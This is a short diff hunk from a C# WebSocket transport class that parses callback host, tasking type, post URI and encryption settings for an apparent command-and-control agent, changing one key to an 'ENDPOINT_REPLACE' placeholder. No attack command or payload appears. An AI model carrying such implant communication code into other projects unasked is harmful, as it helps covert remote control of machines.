@@ -60,7 +60,7 @@ namespace WebsocketTransport
             CallbackHost = data["callback_host"];
             TaskingType = data["tasking_type"];
             Uuid = agent.GetUUID();
-            PostUri = data["post_uri"];
+            PostUri = data["ENDPOINT_REPLACE"];
             EncryptedExchangeCheck = data["encrypted_exchange_check"] == "T";
             //ProxyHost = data["proxy_host"];
             //ProxyPort = data["proxy_port"];
